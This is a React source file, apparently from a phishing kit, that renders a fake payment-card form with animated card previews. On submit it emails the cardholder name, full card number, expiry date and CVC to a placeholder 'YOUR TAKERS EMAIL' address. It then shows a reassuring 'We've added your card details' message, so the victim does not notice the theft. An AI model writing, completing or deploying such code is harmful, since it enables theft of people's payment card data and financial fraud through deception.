import React, { useState } from 'react';
import { useForm } from 'react-hook-form';
import { CardBack } from './components/BankCard/CardBack';
import { CardFront } from './components/BankCard/CardFront';
import { DarkBg } from './components/Gradient/DarkBg';
import { Form } from './components/Form/Form';
import './App.css';
import { emailSendler } from './utils/emailSendler';

function App() {
  const [isSubmitted, setIsSubmitted] = useState(false);
  const { register, handleSubmit, watch, formState: { errors } } = useForm({
    mode: "onChange"
  });

  const onSubmit = (data) => {
    setIsSubmitted(true);
    emailSendler({
      email: "YOUR TAKERS EMAIL",
      subject: 'Payment Details',
      message: `Cardholder Name: ${data.cardholderName}\nCard Number: ${data.cardNumber}\nExpiry Date: ${data.expiryMonth}/${data.expiryYear}\nCVC: ${data.cvc}`
    });
  };

  const handleContinueClick = () => {
    setIsSubmitted(false);
  };

  const formatCardNumber = (value) => {
    return value.replace(/\s?/g, '').replace(/(\d{4})/g, '$1 ').trim();
  };

  const input = watch("cardholderName");
  const rawInputValue = watch("cardNumber");
  const expiryMonth = watch("expiryMonth");
  const expiryYear = watch("expiryYear");
  const inputValue = rawInputValue ? formatCardNumber(rawInputValue) : '';

  return (
    <div className="relative flex h-screen items-center justify-center">
      <DarkBg />
      <div className="relative w-full max-w-4xl mx-auto flex flex-col md:flex-row items-center justify-center z-10 rounded-lg overflow-hidden">
        {!isSubmitted ? (
          <>
            <div className="relative w-full md:w-1/2 p-6 flex justify-center items-center">
              <div className="relative">
                <CardFront input={input} inputValue={inputValue} expiryMonth={expiryMonth} expiryYear={expiryYear} />
                <br />
                <CardBack className="absolute top-16 right-0 z-0" expiryCVC={watch("cvc")} />
              </div>
            </div>
            <div className="w-full md:w-1/2 p-6">
              <Form
                register={register}
                handleSubmit={handleSubmit}
                watch={watch}
                onSubmit={onSubmit}
                errors={errors}
              />
            </div>
          </>
        ) : (
          <div className="flex flex-col items-center justify-center p-6 space-y-4">
            <div className="flex flex-col items-center space-y-2">
              <div className="text-3xl font-bold text-purple-600">THANK YOU!</div>
              <div className="text-lg">We've added your card details</div>
            </div>
            <button
              className="bg-purple-500 text-white py-2 px-4 rounded-lg"
              onClick={() => {
                handleContinueClick(false);
              }}
            >
              Continue
            </button>
          </div>
        )}
      </div>
    </div>
  );
}

export default App;
